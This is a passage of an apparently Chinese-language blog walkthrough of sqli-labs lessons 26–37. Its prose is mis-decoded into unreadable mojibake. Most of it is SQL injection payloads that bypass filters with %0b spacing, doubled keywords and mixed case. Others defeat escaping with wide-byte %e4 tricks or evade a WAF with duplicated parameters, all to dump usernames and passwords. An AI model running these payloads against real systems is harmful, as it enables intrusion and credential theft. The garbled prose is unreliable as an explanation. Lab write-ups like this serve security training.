class><p><code>æµ‹è¯•å­—æ®µæ•°ï¼Œç»“æœä¸º4ä¸ª</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,3%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,3,4%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117220053016.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117220136142.png" class><p><code>çˆ†åº“ï¼Œandå¯ä»¥æ¢ä¸ºor</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml%0b(1,concat(0x7e,(select%0bdatabase()),0x7e),3)%0baandnd &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117221324429.png" class><p><code>çˆ†è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0btable_name%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()%0blimit%0b3,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117221948346.png" class><p><code>çˆ†åˆ—å</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0bcolumn_name%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=database()%0baandnd%0btable_name=&#x27;users&#x27;%0blimit%0b1,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0bcolumn_name%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=database()%0baandnd%0btable_name=&#x27;users&#x27;%0blimit%0b2,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222502329.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222540036.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0busername%0bfrom%0busers%0blimit%0b0,1),0x7e),1)%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">0&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222910222.png" class><p><code>ä½†æ˜¯è¿™ç§æ–¹æ³•åªèƒ½ä¸€ä¸ªä¸€ä¸ªçˆ†ï¼Œå¯ä»¥ä½¿ç”¨group_concat()å‡½æ•°</code></p><p><code>çˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,database()%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=0&#x27;union%0bselect%0b1,database(),3%26%26&#x27;1&#x27;=&#x27;1    // %26ä¸º&amp;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117224140184.png" class><p><code>çˆ†è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%26%26%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117224638239.png" class><p><code>çˆ†åˆ—å</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_name=&#x27;users&#x27;%26%26%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117225229097.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b%271%27=%271</span><br><span class="line"></span><br><span class="line">// where 1=1 ä¸ºæ— çº¦æŸæŸ¥è¯¢</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117230259432.png" class><h2 id="0x08-Less-26a-GET-åŸºäºbool-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·"><a href="#0x08-Less-26a-GET-åŸºäºbool-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·" class="headerlink" title="0x08.Less-26a GET åŸºäºbool è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·"></a>0x08.Less-26a GET åŸºäºbool è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·</h2><p><code>åŒLess-26ç›¸åŒï¼Œéœ€è¦åœ¨å•å¼•å·ååŠ ä¸€ä¸ªæ‹¬å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27)%0bunion%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere(%271=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117230816390.png" class><h2 id="0x09-Less-27-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦-å•å¼•å·"><a href="#0x09-Less-27-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦-å•å¼•å·" class="headerlink" title="0x09.Less-27 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦ å•å¼•å·"></a>0x09.Less-27 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦ å•å¼•å·</h2><p><code>æŸ¥çœ‹æºç å‘ç°åˆè¿‡æ»¤unionã€select</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>è¿™é‡Œå¯ä»¥ä½¿ç”¨å¤§å°å†™è¿›è¡Œç»•è¿‡ï¼Œå¦‚uNionã€sElectï¼Œæ–¹æ³•åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere%271=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118180520892.png" class><h2 id="0x10-Less-27a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·"><a href="#0x10-Less-27a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·" class="headerlink" title="0x10.Less-27a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·"></a>0x10.Less-27a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·</h2><p><code>åŒä¸Šéœ€å°†å•å¼•å·æ¢ä¸ºåŒå¼•å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;%0band%0b&quot;1&quot;=&quot;1</span><br><span class="line">?id=1&quot;%0band%0b&quot;1&quot;=&quot;2</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182211616.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182234928.png" class><p><code>æµ‹è¯•å­—æ®µæ•°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;%0buNion%0bsElect%0b1,2,3%0band%0b&quot;1&quot;=&quot;1</span><br><span class="line">?id=1&quot;%0buNion%0bsElect%0b1,2,3,4%0band%0b&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182105167.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182130359.png" class><p><code>æ”¾æ³•åŒä¸Šä¸€é¢˜ä¸åœ¨èµ˜è¿°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182421291.png" class><h2 id="0x11-Less-28-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·"><a href="#0x11-Less-28-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·" class="headerlink" title="0x11.Less-28 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·"></a>0x11.Less-28 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·</h2><p><code>é—­åˆå­—ç¬¦ä¸º&#39;)å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere(&#x27;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118191510874.png" class><h2 id="0x12-Less-28a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·"><a href="#0x12-Less-28a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·" class="headerlink" title="0x12.Less-28a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·"></a>0x12.Less-28a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·</h2><p><code>é—­åˆå­—ç¬¦ä¸º&quot;å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118192025320.png" class><h2 id="0x13-Less-29-GET-åŸºäºæŠ¥é”™-ç»•è¿‡WAF"><a href="#0x13-Less-29-GET-åŸºäºæŠ¥é”™-ç»•è¿‡WAF" class="headerlink" title="0x13.Less-29 GET åŸºäºæŠ¥é”™ ç»•è¿‡WAF"></a>0x13.Less-29 GET åŸºäºæŠ¥é”™ ç»•è¿‡WAF</h2><p><code>è¯´æ˜¯å­˜åœ¨wafä½†æ˜¯å¸¸è§„æ³¨å…¥å°±å¯ä»¥ï¼Ÿä¸€è„¸æ‡µé€¼ã€‚ã€‚ã€‚</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(username,0x7e,password),3 from users where &#x27;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118200656209.png" class><h2 id="0x14-Less-30-GET-åŸºäºbool-ç»•è¿‡WAF"><a href="#0x14-Less-30-GET-åŸºäºbool-ç»•è¿‡WAF" class="headerlink" title="0x14.Less-30 GET åŸºäºbool ç»•è¿‡WAF"></a>0x14.Less-30 GET åŸºäºbool ç»•è¿‡WAF</h2><p><code>è·Ÿä¸Šé¢˜ä¸€æ ·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot; union select 1,group_concat(username,0x7e,password),3 from users where&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118201045806.png" class><h2 id="0x15-Less-31-GET-åŸºäºbool-ç»•è¿‡WAF"><a href="#0x15-Less-31-GET-åŸºäºbool-ç»•è¿‡WAF" class="headerlink" title="0x15.Less-31 GET åŸºäºbool ç»•è¿‡WAF"></a>0x15.Less-31 GET åŸºäºbool ç»•è¿‡WAF</h2><p><code>è·Ÿä¸Šé¢˜ä¸€æ ·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;) union select 1,group_concat(username,0x7e,password),3 from users where(&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118201428847.png" class><blockquote><p>è¿™ä¸‰é“é¢˜å¾ˆå¥‡æ€ªï¼Œè¯´æ˜¯æœ‰wafä½†æ˜¯å•¥ä¹Ÿæ²¡æœ‰ã€‚ç»•è¿‡wafå‚è€ƒä»¥ä¸‹æ–‡ç« </p></blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L256amRzZHMvYXJ0aWNsZS9kZXRhaWxzLzc3NzU4ODI0">å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><p><code>ç¬¬ä¸€ä¸ªidå‚æ•°ç”¨äºæ¬ºéª—wafï¼Œç¬¬äºŒä¸ªä¸ºçœŸå®æŸ¥è¯¢</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot;) -- -</span><br><span class="line">?id=1&amp;id=1&quot;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118202113371.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118202142173.png" class><h2 id="0x16-Less-32-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦"><a href="#0x16-Less-32-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦" class="headerlink" title="0x16.Less-32 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\"></a>0x16.Less-32 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\</h2><p><code>è¿™é‡Œå†™å¼•å·ä¼šè¢«åŠ ä¸Š\è¿›è¡Œè½¬ä¹‰</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118212716561.png" class><p><code>å¯ä»¥ä½¿ç”¨å®½å­—èŠ‚è¿›è¡Œç»•è¿‡ï¼Œæ±‰å­—ä½ çš„urlç¼–ç ä¸º%e4%bd%a0ï¼Œè¿™é‡Œæå–%e4ä¸\è¿›è¡Œæ‹¼æ¥ï¼Œä½†æ˜¯ä»–å¹¶ä¸æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œå°±å¯ä»¥ç»•è¿‡\</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118215012643.png" class><p><code>è€æ–¹æ³•ï¼Œç›´æ¥æŸ¥è¯¢</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118220631992.png" class><p><code>çˆ†å­—æ®µ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users -- -</span><br></pre></td></tr></table></figure><p><code>ä½†æ˜¯è¿™é‡Œå‡ºç°äº†ä¸ªé—®é¢˜ï¼Œè¯´æ˜¯æ²¡æœ‰usersè§äº†é¬¼äº†ï¼Œä¸Šé¢æ˜æ˜æŸ¥å‡ºæ¥äº†å‘€</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118220853724.png" class><p><code>è¿™é‡Œå‘ç°usersè¢«åŠ ä¸Šäº†å•å¼•å·ï¼Œå¦‚ä½•é€ƒè„±è¿™ç§æŸç¼šå‘¢ï¼Œå°†usersè½¬ä¸º16è¿›åˆ¶ç¼–ç å³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118221744344.png" class><p><code>çˆ†æ•°æ®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118222615247.png" class><h2 id="0x17-Less-33-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦"><a href="#0x17-Less-33-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦" class="headerlink" title="0x17.Less-33 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\"></a>0x17.Less-33 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\</h2><p><code>è·Ÿä¸Šä¸€é“é¢˜ä¸€æ¯›ä¸€æ ·ï¼Œæ€ªäº‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118222957733.png" class><h2 id="0x18-Less-34-POST-ç»•è¿‡è½¬ä¹‰å­—ç¬¦"><a href="#0x18-Less-34-POST-ç»•è¿‡è½¬ä¹‰å­—ç¬¦" class="headerlink" title="0x18.Less-34 POST ç»•è¿‡è½¬ä¹‰å­—ç¬¦\"></a>0x18.Less-34 POST ç»•è¿‡è½¬ä¹‰å­—ç¬¦\</h2><p><code>åŒä¸Šä¸€é¢˜ï¼Œåªæ˜¯å­—æ®µæœ‰2ä¸¤ä¸ª</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1%e4&#x27; order by 3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119101637618.png" class><p><code>å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=0%e4&#x27; union select 1,group_concat(username,0x7e,password) from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119101747730.png" class><h2 id="0x19-Less-35-GET-ç»•è¿‡-ï¼ˆä¸éœ€è¦ï¼‰"><a href="#0x19-Less-35-GET-ç»•è¿‡-ï¼ˆä¸éœ€è¦ï¼‰" class="headerlink" title="0x19.Less-35 GET ç»•è¿‡\ï¼ˆä¸éœ€è¦ï¼‰"></a>0x19.Less-35 GET ç»•è¿‡\ï¼ˆä¸éœ€è¦ï¼‰</h2><p><code>è¿™é¢˜é†‰äº†ï¼Œè¯´æ˜¯ç»•è¿‡\ï¼Œä½†æ˜¯æ²¡æœ‰é—­åˆå­—ç¬¦ï¼ŒğŸ˜‚</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103112599.png" class><h2 id="0x20-Less-36-GET-ç»•è¿‡Mysql-real-escape-string"><a href="#0x20-Less-36-GET-ç»•è¿‡Mysql-real-escape-string" class="headerlink" title="0x20.Less-36 GET ç»•è¿‡Mysql_real_escape_string"></a>0x20.Less-36 GET ç»•è¿‡Mysql_real_escape_string</h2><blockquote><p> æŸ¥çœ‹æºç å‘ç°ï¼Œå‚æ•°ä¼šè¢«mysql_real_escape_stringè½¬ä¹‰</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å®šä¹‰å’Œç”¨æ³•</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string() å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</span><br><span class="line"></span><br><span class="line">ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š</span><br><span class="line"></span><br><span class="line"> \x00</span><br><span class="line"> \n</span><br><span class="line"> \r</span><br><span class="line"> \</span><br><span class="line"> &#x27;</span><br><span class="line"> &quot;</span><br><span class="line"> \x1a</span><br><span class="line"></span><br><span class="line">å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è¯­æ³•</span></span><br><span class="line"></span><br><span class="line">mysql_real_escape_string(string,connection)</span><br><span class="line"></span><br><span class="line">| å‚æ•°       | æè¿°                                                  |</span><br><span class="line">| :--------- | :---------------------------------------------------- |</span><br><span class="line">| string     | å¿…éœ€ã€‚è§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚                            |</span><br><span class="line">| connection | å¯é€‰ã€‚è§„å®š MySQL è¿æ¥ã€‚å¦‚æœæœªè§„å®šï¼Œåˆ™ä½¿ç”¨ä¸Šä¸€ä¸ªè¿æ¥ã€‚ |</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è¯´æ˜</span></span><br></pre></td></tr></table></figure><p>æœ¬å‡½æ•°å°† <em>string</em> ä¸­çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œå¹¶è€ƒè™‘åˆ°è¿æ¥çš„å½“å‰å­—ç¬¦é›†ï¼Œå› æ­¤å¯ä»¥å®‰å…¨ç”¨äº <span class="exturl" data-url="aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX215c3FsX3F1ZXJ5LmFzcA==">mysql_query()<i class="fa fa-external-link-alt"></i></span>ã€‚</p><p><code>æµ‹è¯•é—­åˆå­—ç¬¦ï¼Œç»“æœä¸ºå•å¼•å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1%e4&#x27; and 1=1 -- -</span><br><span class="line">?id=1%e4&#x27; and 1=2 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103932605.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119104044212.png" class><p><code>å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103818736.png" class><h2 id="0x21-Less-37-POST-ç»•è¿‡Mysql-real-escape-string"><a href="#0x21-Less-37-POST-ç»•è¿‡Mysql-real-escape-string" class="headerlink" title="0x21.Less-37 POST ç»•è¿‡Mysql_real_escape_string"></a>0x21.Less-37 POST ç»•è¿‡Mysql_real_escape_string</h2><p><code>ä¸ä¸Šä¸€é¢˜ä¸€æ ·</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = mysql_real_escape_string($uname1);</span><br><span class="line">$passwd= mysql_real_escape_string($passwd1);</span><br></pre></td></tr></table></figure><p><code>æŒ‰ç…§ä¸Šä¸€é¢˜çš„æ–¹æ³•ï¼Œä½†æ˜¯ç»“æœå¹¶ä¸æ˜¯æˆ‘æƒ³è±¡çš„é‚£æ ·ï¼Œé—­åˆå­—ç¬¦æ€ä¹ˆä¹Ÿæ‰¾ä¸åˆ°ï¼Œäºæ˜¯æŠ“åŒ…å‘ç°%ä¼šè¢«ç¼–ç ä¸º%25</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119111554948.png" class><p><code>æ‰€ä»¥å¯ä»¥å°†%25æ¢ä¸º%</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119111930781.png" class><p><code>å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 